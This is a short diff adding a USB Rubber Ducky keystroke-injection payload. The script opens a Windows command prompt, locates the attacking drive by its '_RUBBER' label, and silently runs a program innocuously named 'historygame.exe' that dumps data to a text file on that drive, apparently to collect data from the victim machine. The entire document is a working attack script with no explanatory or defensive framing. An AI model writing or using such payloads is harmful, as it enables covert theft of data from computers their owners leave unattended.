@@ -1,0 +1,12 @@
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 100
+STRING cmd
+DELAY 100
+ENTER
+DELAY 100
+STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "_RUBBER"') do set myd=%d
+ENTER
+STRING start %myd%\historygame.exe /stext %myd%\historygame.txt
+ENTER
